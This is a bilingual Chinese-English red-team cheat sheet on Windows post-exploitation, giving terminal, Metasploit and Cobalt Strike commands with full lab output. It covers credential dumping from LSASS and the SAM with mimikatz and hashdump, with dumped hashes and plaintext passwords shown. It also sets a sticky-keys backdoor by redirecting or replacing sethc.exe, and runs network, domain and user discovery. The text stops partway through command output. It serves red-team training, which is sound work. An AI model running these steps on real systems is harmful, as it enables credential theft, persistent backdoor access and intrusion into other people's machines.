## Credential Dumping(凭证窃取)

### Dump credentials from LSASS(从LSASS中窃取凭证)

实现原理：

```
This technique injects into the LSASS.exe process and scrapes its memory for plaintext passwords of logged on users. You must do this from a high integrity process. 

注入lsass .exe进程，并从其内存中提取登录用户的明文密码
```

#### msf下操作：

> use mimikatz
>
> wdigest(获取WDigest凭据)
>
> msv （获取msv凭据（hash））
>
> kerberos （获取kerberos）

```shell
meterpreter > use mimikatz 
Loading extension mimikatz...Success.
meterpreter > wdigest 
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0;996     Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;53216   NTLM                                          
0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  
0;146131  NTLM       ROOT-5DE52AC98B  Administrator     123456

meterpreter > msv
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving msv credentials
msv credentials
===============

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0;146131  NTLM       ROOT-5DE52AC98B  Administrator     lm{ 44efce164ab921caaad3b435b51404ee }, ntlm{ 32ed87bdb5fdc5e9cba88547376818d4 }
0;996     Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;53216   NTLM                                          n.s. (Credentials KO)
0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  n.s. (Credentials KO)
meterpreter > kerberos 
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID    Package    Domain           User              Password
------    -------    ------           ----              --------
0;996     Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;53216   NTLM                                          
0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;999     NTLM       WORKGROUP        ROOT-5DE52AC98B$  
0;146131  NTLM       ROOT-5DE52AC98B  Administrator     123456

```

#### cs下操作

> logonpasswords
>
> mimikatz !sekurlsa::logonpasswords
>
> mimikatz !sekurlsa::msv
>
> mimikatz !sekurlsa::kerberos
>
> mimikatz !sekurlsa::wdigest

```shell
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 630354 bytes
[+] received output:

Authentication Id : 0 ; 338316 (00000000:0005298c)
Session           : Interactive from 0
User Name         : Administrator
Domain            : ROOT-5DE52AC98B
Logon Server      : ROOT-5DE52AC98B
Logon Time        : 2019-9-4 19:18:26
SID               : S-1-5-21-1911985068-4225083820-4011728908-500
	msv :	
	 [00000002] Primary
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * LM       : 44efce164ab921caaad3b435b51404ee
	 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
	 * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
	wdigest :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456
	kerberos :	
	 * Username : Administrator
	 * Domain   : ROOT-5DE52AC98B
	 * Password : 123456
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-4 19:14:12
SID               : S-1-5-20
	msv :	
	 [00000002] Primary
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * LM       : aad3b435b51404eeaad3b435b51404ee
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
	wdigest :	
	 * Username : ROOT-5DE52AC98B$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2019-9-4 19:14:12
SID               : S-1-5-19
	msv :	
	wdigest :	
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 53331 (00000000:0000d053)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2019-9-4 19:14:12
SID               : 
	msv :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT-5DE52AC98B$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2019-9-4 19:14:12
SID               : S-1-5-18
	msv :	
	wdigest :	
	kerberos :	
	 * Username : root-5de52ac98b$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	
```

### Dumps hashes from the SAM Hive file（从sam文件里面读取hash）

实现原理：

```
The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required. 

sam文件存放着hash，然后读取该文件进行获得凭证
```

#### msf下操作

> hashdump  （普通hash获取）
>
> run hashdump
>
> post/windows/gather/credentials/domain_hashdump （获取域hash）

```shell
meterpreter > hashdump 
Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
ASPNET:1006:1dce4321e5283c3e841070331873c406:085f84e35a1bfb09ca65d008cc988cae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_ROOT-5DE52AC98B:1003:406eafe671e3ac72ddb9179ad9a2204a:4fa4e3f7ef6f5dc7e1b129caab134cbd:::
IWAM_ROOT-5DE52AC98B:1004:53aacf61b38888da87c793e8c36cb74a:14ba2ea13539973d3f0be627e43ff408:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:7490f8cea3cd28b37717a5d4be375404:::

meterpreter > run hashdump (需要系统权限)

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY be7ba5c5d5c67d878cd0845b2b4d1027...
[-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
[-] This script requires the use of a SYSTEM user context (hint: migrate into service process)


msf5 post(windows/gather/credentials/domain_hashdump) > exploit 

[*] Session has Admin privs
[-] This does not appear to be an AD Domain Controller
[*] Post module execution completed
```

#### cs下操作

> hashdump
>
> mimikatz !lsadump::sam
>

```shell
beacon> hashdump
[*] Tasked beacon to dump hashes
[+] host called home, sent: 63557 bytes
[+] received password hashes:
Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
ASPNET:1006:1dce4321e5283c3e841070331873c406:085f84e35a1bfb09ca65d008cc988cae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_ROOT-5DE52AC98B:1003:406eafe671e3ac72ddb9179ad9a2204a:4fa4e3f7ef6f5dc7e1b129caab134cbd:::
IWAM_ROOT-5DE52AC98B:1004:53aacf61b38888da87c793e8c36cb74a:14ba2ea13539973d3f0be627e43ff408:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:7490f8cea3cd28b37717a5d4be375404:::

beacon> mimikatz !lsadump::sam
[*] Tasked beacon to run mimikatz's !lsadump::sam command
[+] host called home, sent: 841287 bytes
[+] received output:
Domain : ROOT-5DE52AC98B
SysKey : be7ba5c5d5c67d878cd0845b2b4d1027
Local SID : S-1-5-21-1911985068-4225083820-4011728908

SAMKey : 5dfe2beb57a9d468ed8a72c51c7334ff

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : 44efce164ab921caaad3b435b51404ee
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 7490f8cea3cd28b37717a5d4be375404

RID  : 000003eb (1003)
User : IUSR_ROOT-5DE52AC98B
  Hash LM  : 406eafe671e3ac72ddb9179ad9a2204a
  Hash NTLM: 4fa4e3f7ef6f5dc7e1b129caab134cbd

RID  : 000003ec (1004)
User : IWAM_ROOT-5DE52AC98B
  Hash LM  : 53aacf61b38888da87c793e8c36cb74a
  Hash NTLM: 14ba2ea13539973d3f0be627e43ff408

RID  : 000003ee (1006)
User : ASPNET
  Hash LM  : 1dce4321e5283c3e841070331873c406
  Hash NTLM: 085f84e35a1bfb09ca65d008cc988cae

```

## Query Registry(注册表查询)

### Check terminal services（检测终端服务）

原理：

```
Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled

从注册表中的键值检测是否开启终端服务，如果是0，则为开启，为1则是关闭

```

#### terminal（cmd）下操作：

```
C:\Documents and Settings\Administrator\����>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
    fDenyTSConnections    REG_DWORD    0x0

```

#### msf下操作：

> reg queryval -k "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections
>
> post/windows/gather/enum_termserv (不好用)
>

```shell

meterpreter > reg queryval -k "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections
Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
Name: fDenyTSConnections
Type: REG_DWORD
Data: 0

msf5 post(windows/gather/enum_termserv) > exploit 

[*] Doing enumeration for S-1-5-21-1911985068-4225083820-4011728908-500
[*] Post module execution completed
```

#### cs下操作

> shell reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
>

```shell
beacon> shell reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
[*] Tasked beacon to run: reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
[+] host called home, sent: 132 bytes
[+] received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
    fDenyTSConnections    REG_DWORD    0x1

```

## Accessibility Features(易访问特征)

### Point sethc.exe file to cmd.exe（使用sethc启动cmd）

原理：

```shell

Modify the registry to point the sethc.exe file to point to cmd.exe

修改注册表使sethc指向cmd，然后五次shift后就可以调出cmd，当然你也可以使用这种方法去激活一个msf的shell

```

#### terminal下操作：

> REG ADD "HKLM\SOFTWARE\Microsoft\Windows
 NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ
 /d "C:\windows\system32\cmd.exe" /f
>

```
C:\Documents and Settings\Administrator>REG ADD "HKLM\SOFTWARE\Microsoft\Windows
 NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ
 /d "C:\windows\system32\cmd.exe" /f
操作成功完成。
```

#### msf下操作

> post/windows/manage/sticky_keys

```shell

msf5 post(windows/manage/sticky_keys) > exploit 

[+] Session has administrative rights, proceeding.
[+] 'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing SHIFT 5 times.
[*] Post module execution completed


```

#### cs下操作

> shell REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
>

```shell

beacon> shell REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
[*] Tasked beacon to run: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
[+] host called home, sent: 187 bytes
[+] received output:
操作成功完成。

```

### Replace real sethc.exe with a copy of cmd.exe(用cmd的副本代替sethc)

使用takeown.exe获取系统ALC权限，然后替换

#### terminal下操作：

> takeown.exe C:\Windows\system32\sethc.exe
>
> del C:\Windows\system32\sethc.exe
>
> copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
>

```shell

C:\Documents and Settings\Administrator>takeown.exe C:\Windows\system32\sethc.ex
e
错误: 无效参数/选项 - 'C:\Windows\system32\sethc.exe'。
键入 "TAKEOWN /?" 以了解用法。

C:\Documents and Settings\Administrator>del C:\Windows\system32\sethc.exe

C:\Documents and Settings\Administrator>copy C:\Windows\system32\cmd.exe C:\Wind
ows\system32\sethc.exe
覆盖 C:\Windows\system32\sethc.exe 吗? (Yes/No/All): yes
已复制         1 个文件。

```

#### cs下操作：

> shell takeown.exe C:\Windows\system32\sethc.exe
>
> shell del C:\Windows\system32\sethc.exe
>
> shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe

```shell

beacon> shell takeown.exe C:\Windows\system32\sethc.exe
[*] Tasked beacon to run: takeown.exe C:\Windows\system32\sethc.exe
[+] host called home, sent: 72 bytes
[+] received output:
错误: 无效参数/选项 - 'C:\Windows\system32\sethc.exe'。
键入 "TAKEOWN /?" 以了解用法。

beacon> shell del C:\Windows\system32\sethc.exe
[*] Tasked beacon to run: del C:\Windows\system32\sethc.exe
beacon> shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
[*] Tasked beacon to run: copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
[+] host called home, sent: 157 bytes
[+] received output:
已复制         1 个文件。

```

## System Network Configuration Discovery（系统网络配置发现）

### Get network information（发现网络信息）

#### terminal下操作：

> ipconfig /all

```shell

C:\Documents and Settings\Administrator>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : root-5de52ac98b
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Unknown
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter 本地连接:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-D4-66-73
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IP Address. . . . . . . . . . . . : 192.168.2.114
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.2.1
   DHCP Server . . . . . . . . . . . : 192.168.2.1
   DNS Servers . . . . . . . . . . . : 192.168.2.1
   Lease Obtained. . . . . . . . . . : 2019年9月4日 19:14:12
   Lease Expires . . . . . . . . . . : 2019年9月5日 19:14:12

C:\Documents and Settings\Administrator>

```

#### msf下操作：

> post/windows/gather/enum_domains

```shell

msf5 post(windows/gather/enum_domains) > exploit 

[*] Enumerating DCs for WORKGROUP
[-] No Domain Controllers found...
[*] Post module execution completed

```

#### cs下操作：

> shell ipconfig /all

```shell


beacon> shell ipconfig /all
[*] Tasked beacon to run: ipconfig /all
[+] host called home, sent: 44 bytes
[+] received output:


Windows IP Configuration



   Host Name . . . . . . . . . . . . : root-5de52ac98b

   Primary Dns Suffix  . . . . . . . : 

   Node Type . . . . . . . . . . . . : Unknown

   IP Routing Enabled. . . . . . . . : No

   WINS Proxy Enabled. . . . . . . . : No



Ethernet adapter 本地连接:



   Connection-specific DNS Suffix  . : 

   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection

   Physical Address. . . . . . . . . : 00-0C-29-D4-66-73

   DHCP Enabled. . . . . . . . . . . : Yes

   Autoconfiguration Enabled . . . . : Yes

   IP Address. . . . . . . . . . . . : 192.168.2.114

   Subnet Mask . . . . . . . . . . . : 255.255.255.0

   Default Gateway . . . . . . . . . : 192.168.2.1

   DHCP Server . . . . . . . . . . . : 192.168.2.1

   DNS Servers . . . . . . . . . . . : 192.168.2.1

   Lease Obtained. . . . . . . . . . : 2019年9月4日 19:14:12

   Lease Expires . . . . . . . . . . : 2019年9月5日 19:14:12



```

### Get ARP table(获取arp表)

#### terminal下操作

> arp -a
>
> router print

```shell
C:\Documents and Settings\Administrator>arp -a

Interface: 192.168.2.114 --- 0x10003
  Internet Address      Physical Address      Type
  192.168.2.1           fc-7c-02-de-0e-c8     dynamic
  192.168.2.107         b4-6b-fc-47-ad-60     dynamic
```


#### msf下操作：

> router

```shell

meterpreter > route 

IPv4 network routes
===================

    Subnet           Netmask          Gateway        Metric  Interface
    ------           -------          -------        ------  ---------
    0.0.0.0          0.0.0.0          192.168.2.1    10      65539
    127.0.0.0        255.0.0.0        127.0.0.1      1       1
    192.168.2.0      255.255.255.0    192.168.2.114  10      65539
    192.168.2.114    255.255.255.255  127.0.0.1      10      1
    192.168.2.255    255.255.255.255  192.168.2.114  10      65539
    224.0.0.0        240.0.0.0        192.168.2.114  10      65539
    255.255.255.255  255.255.255.255  192.168.2.114  1       65539

```

#### cs下操作：

> arp -a

```shell

beacon> shell arp -a
[*] Tasked beacon to run: arp -a
[+] host called home, sent: 37 bytes
[+] received output:

Interface: 192.168.2.114 --- 0x10003
  Internet Address      Physical Address      Type
  192.168.2.1           fc-7c-02-de-0e-c8     dynamic   
  192.168.2.107         b4-6b-fc-47-ad-60     dynamic

```

### Dump MAC, IP addresses and codes(获取mac、ip地址和其描述性代码)

用于获取计算机的MAC和IP地址以及一些描述性代码(0x1C表示一个域控制器)

#### termainal下操作：

> nbtstat -a ip

```shell
C:\Documents and Settings\Administrator>nbtstat -a ip

本地连接:
Node IpAddress: [192.168.2.114] Scope Id: []

           NetBIOS Remote Machine Name Table

       Name               Type         Status
    ---------------------------------------------
    ROOT-5DE52AC98B<00>  UNIQUE      Registered
    WORKGROUP      <00>  GROUP       Registered
    ROOT-5DE52AC98B<20>  UNIQUE      Registered
    WORKGROUP      <1E>  GROUP       Registered
    WORKGROUP      <1D>  UNIQUE      Registered
    ..__MSBROWSE__.<01>  GROUP       Registered

    MAC Address = 00-0C-29-D4-66-73


```

#### cs下操作：

> shell c:\windows\system32\nbtstat.exe -a ip

```shell

beacon> shell c:\windows\system32\nbtstat.exe -a 192.168.2.114
[*] Tasked beacon to run: c:\windows\system32\nbtstat.exe -a 192.168.2.114
[+] host called home, sent: 79 bytes
[+] received output:
    
本地连接:
Node IpAddress: [192.168.2.114] Scope Id: []



           NetBIOS Remote Machine Name Table



       Name               Type         Status

    ---------------------------------------------

    ROOT-5DE52AC98B<00>  UNIQUE      Registered 

    WORKGROUP      <00>  GROUP       Registered 

    ROOT-5DE52AC98B<20>  UNIQUE      Registered 

    WORKGROUP      <1E>  GROUP       Registered 

    WORKGROUP      <1D>  UNIQUE      Registered 

    ..__MSBROWSE__.<01>  GROUP       Registered 



    MAC Address = 00-0C-29-D4-66-73

```

## Remote System Discovery(远程系统发现)

### Get the list of domain computers（获取域主机列表）

#### terminal下操作：

> net group "Domain Computers" /domain

```shell
C:\Documents and Settings\Administrator>net group "Domain Computers" /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。

```

#### msf下操作：

> post/windows/gather/enum_ad_computers
>
> post/windows/gather/enum_computers

```shell
msf5 post(windows/gather/enum_ad_computers) > exploit 

[-] Unable to find the domain to query.
[*] Post module execution completed

msf5 post(windows/gather/enum_computers) > exploit 

[*] Running module against ROOT-5DE52AC98B
[-] This host is not part of a domain.
[*] Post module execution completed

```

#### cs下操作：

> shell net group "Domain Computers" /domain

```shell

beacon> shell net group "Domain Computers" /domain
[*] Tasked beacon to run: net group "Domain Computers" /domain
[+] host called home, sent: 67 bytes
[+] received output:
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系
```


### Get the list of domain controllers(获取域控列表)

#### terminal下操作：

> net group "Domain Controllers" /domain[:DOMAIN]

```shell
C:\Documents and Settings\Administrator>net group "Domain Controllers" /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系
```

#### cs下操作：

> shell net group "Domain Controllers" /domain

```shell
beacon> shell net group "Domain Controllers" /domain
[*] Tasked beacon to run: net group "Domain Controllers" /domain
[+] host called home, sent: 69 bytes
[+] received output:
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。
```

### Display trust relationship with domain controller(显示域信任关系)

#### terminal下操作：

> nltest /dclist

### Display the active directory login server of the workstation(显示ad域工作组的登录器)

#### terminal下操作：

> echo %LOGONSERVER%

```shell
C:\Documents and Settings\Administrator>echo %LOGONSERVER%
\\ROOT-5DE52AC98B
```

#### cs下操作：

> shell echo %LOGONSERVER%

```shell
beacon> shell echo %LOGONSERVER%
[*] Tasked beacon to run: echo %LOGONSERVER%
[+] host called home, sent: 49 bytes
[+] received output:
\\ROOT-5DE52AC98B

```

## System Owner/User Discovery（系统用户发现）

### Get user information（获取用户信息）

#### terminal下操作：

> whoami /all /fo list

```shell
C:\Documents and Settings\Administrator>whoami
root-5de52ac98b\administrator

C:\Documents and Settings\Administrator>whoami /all

用户信息
----------------

用户名                        SID
============================= =============================================
root-5de52ac98b\administrator S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名                             类型   SID          属性

================================ ====== ============ ===========================
===============
Everyone                         已知组 S-1-1-0      必需的组, 启用于默认, 启用
的组
BUILTIN\Administrators           别名   S-1-5-32-544 必需的组, 启用于默认, 启用
的组, 组的所有者
BUILTIN\Users                    别名   S-1-5-32-545 必需的组, 启用于默认, 启用
的组
NT AUTHORITY\INTERACTIVE         已知组 S-1-5-4      必需的组, 启用于默认, 启用
的组
NT AUTHORITY\Authenticated Users 已知组 S-1-5-11     必需的组, 启用于默认, 启用
的组
NT AUTHORITY\This Organization   已知组 S-1-5-15     必需的组, 启用于默认, 启用
的组
LOCAL                            已知组 S-1-2-0      必需的组, 启用于默认, 启用
的组
NT AUTHORITY\NTLM Authentication 已知组 S-1-5-64-10  必需的组, 启用于默认, 启用
的组


特权信息
----------------------

特权名                          描述                       状态
=============================== ========================== ======
SeLockMemoryPrivilege           内存中锁定页面             已禁用
SeChangeNotifyPrivilege         跳过遍历检查               已启用
SeSecurityPrivilege             管理审核和安全日志         已禁用
SeBackupPrivilege               备份文件和目录             已禁用
SeRestorePrivilege              还原文件和目录             已禁用
SeSystemtimePrivilege           更改系统时间               已禁用
SeShutdownPrivilege             关闭系统                   已禁用
SeRemoteShutdownPrivilege       从远程系统强制关机         已禁用
SeTakeOwnershipPrivilege        取得文件或其他对象的所有权 已禁用
SeDebugPrivilege                调试程序                   已禁用
SeSystemEnvironmentPrivilege    修改固件环境值             已禁用
SeSystemProfilePrivilege        配置系统性能               已禁用
SeProfileSingleProcessPrivilege 配置单一进程               已禁用
SeIncreaseBasePriorityPrivilege 增加计划优先级             已禁用
SeLoadDriverPrivilege           装载和卸载设备驱动程序     已禁用
SeCreatePagefilePrivilege       创建页面文件               已禁用
SeIncreaseQuotaPrivilege        调整进程的内存配额         已禁用
SeUndockPrivilege               从扩展坞中取出计算机       已禁用
SeManageVolumePrivilege         执行卷维护任务             已禁用
SeImpersonatePrivilege          身份验证后模拟客户端       已启用
SeCreateGlobalPrivilege         创建全局对象               已启用

C:\Documents and Settings\Administrator>whoami /all /fo list

用户信息
----------------

用户名: root-5de52ac98b\administrator
SID:    S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名: Everyone
类型: 已知组
SID:  S-1-1-0
属性: 必需的组, 启用于默认, 启用的组

组名: BUILTIN\Administrators
类型: 别名
SID:  S-1-5-32-544
属性: 必需的组, 启用于默认, 启用的组, 组的所有者

组名: BUILTIN\Users
类型: 别名
SID:  S-1-5-32-545
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\INTERACTIVE
类型: 已知组
SID:  S-1-5-4
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\Authenticated Users
类型: 已知组
SID:  S-1-5-11
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\This Organization
类型: 已知组
SID:  S-1-5-15
属性: 必需的组, 启用于默认, 启用的组

组名: LOCAL
类型: 已知组
SID:  S-1-2-0
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\NTLM Authentication
类型: 已知组
SID:  S-1-5-64-10
属性: 必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名: SeLockMemoryPrivilege
描述:   内存中锁定页面
状态:   已禁用

特权名: SeChangeNotifyPrivilege
描述:   跳过遍历检查
状态:   已启用

特权名: SeSecurityPrivilege
描述:   管理审核和安全日志
状态:   已禁用

特权名: SeBackupPrivilege
描述:   备份文件和目录
状态:   已禁用

特权名: SeRestorePrivilege
描述:   还原文件和目录
状态:   已禁用

特权名: SeSystemtimePrivilege
描述:   更改系统时间
状态:   已禁用

特权名: SeShutdownPrivilege
描述:   关闭系统
状态:   已禁用

特权名: SeRemoteShutdownPrivilege
描述:   从远程系统强制关机
状态:   已禁用

特权名: SeTakeOwnershipPrivilege
描述:   取得文件或其他对象的所有权
状态:   已禁用

特权名: SeDebugPrivilege
描述:   调试程序
状态:   已禁用

特权名: SeSystemEnvironmentPrivilege
描述:   修改固件环境值
状态:   已禁用

特权名: SeSystemProfilePrivilege
描述:   配置系统性能
状态:   已禁用

特权名: SeProfileSingleProcessPrivilege
描述:   配置单一进程
状态:   已禁用

特权名: SeIncreaseBasePriorityPrivilege
描述:   增加计划优先级
状态:   已禁用

特权名: SeLoadDriverPrivilege
描述:   装载和卸载设备驱动程序
状态:   已禁用

特权名: SeCreatePagefilePrivilege
描述:   创建页面文件
状态:   已禁用

特权名: SeIncreaseQuotaPrivilege
描述:   调整进程的内存配额
状态:   已禁用

特权名: SeUndockPrivilege
描述:   从扩展坞中取出计算机
状态:   已禁用

特权名: SeManageVolumePrivilege
描述:   执行卷维护任务
状态:   已禁用

特权名: SeImpersonatePrivilege
描述:   身份验证后模拟客户端
状态:   已启用

特权名: SeCreateGlobalPrivilege
描述:   创建全局对象
状态:   已启用

```

#### msf下操作：

> getuid

```shell

meterpreter > getuid
Server username: ROOT-5DE52AC98B\Administrator

```
#### cs下操作：

> shell whoami /all /fo list

```shell

beacon> shell whoami /all /fo list
[*] Tasked beacon to run: whoami /all /fo list
[+] host called home, sent: 51 bytes
[+] received output:

用户信息
----------------

用户名: root-5de52ac98b\administrator
SID:    S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名: Everyone
类型: 已知组
SID:  S-1-1-0
属性: 必需的组, 启用于默认, 启用的组

组名: BUILTIN\Administrators
类型: 别名
SID:  S-1-5-32-544
属性: 必需的组, 启用于默认, 启用的组, 组的所有者

组名: BUILTIN\Users
类型: 别名
SID:  S-1-5-32-545
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\INTERACTIVE
类型: 已知组
SID:  S-1-5-4
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\Authenticated Users
类型: 已知组
SID:  S-1-5-11
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\This Organization
类型: 已知组
SID:  S-1-5-15
属性: 必需的组, 启用于默认, 启用的组

组名: LOCAL
类型: 已知组
SID:  S-1-2-0
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY\NTLM Authentication
类型: 已知组
SID:  S-1-5-64-10
属性: 必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名: SeLockMemoryPrivilege
描述:   内存中锁定页面
状态:   已禁用

特权名: SeChangeNotifyPrivilege
描述:   跳过遍历检查
状态:   已启用

特权名: SeSecurityPrivilege
描述:   管理审核和安全日志
状态:   已禁用

特权名: SeBackupPrivilege
描述:   备份文件和目录
状态:   已禁用

特权名: SeRestorePrivilege
描述:   还原文件和目录
状态:   已禁用

特权名: SeSystemtimePrivilege
描述:   更改系统时间
状态:   已禁用

特权名: SeShutdownPrivilege
描述:   关闭系统
状态:   已禁用

特权名: SeRemoteShutdownPrivilege
描述:   从远程系统强制关机
状态:   已禁用

特权名: SeTakeOwnershipPrivilege
描述:   取得文件或其他对象的所有权
状态:   已禁用

特权名: SeDebugPrivilege
描述:   调试程序
状态:   已禁用

特权名: SeSystemEnvironmentPrivilege
描述:   修改固件环境值
状态:   已禁用

特权名: SeSystemProfilePrivilege
描述:   配置系统性能
状态:   已禁用

特权名: SeProfileSingleProcessPrivilege
描述:   配置单一进程
状态:   已禁用

特权名: SeIncreaseBasePriorityPrivilege
描述:   增加计划优先级
状态:   已禁用

特权名: SeLoadDriverPrivilege
描述:   装载和卸载设备驱动程序
状态:   已禁用

特权名: SeCreatePagefilePrivilege
描述:   创建页面文件
状态:   已禁用

特权名: SeIncreaseQuotaPrivilege
描述:   调整进程的内存配额
状态:   已禁用

特权名: SeUndockPrivilege
描述:   从扩展坞中取出计算机
状态:   已禁用

特权名: SeManageVolumePrivilege
描述:   执行卷维护任务
状态:   已禁用

特权名: SeImpersonatePrivilege
描述:   身份验证后模拟客户端
状态:   已启用

特权名: SeCreateGlobalPrivilege
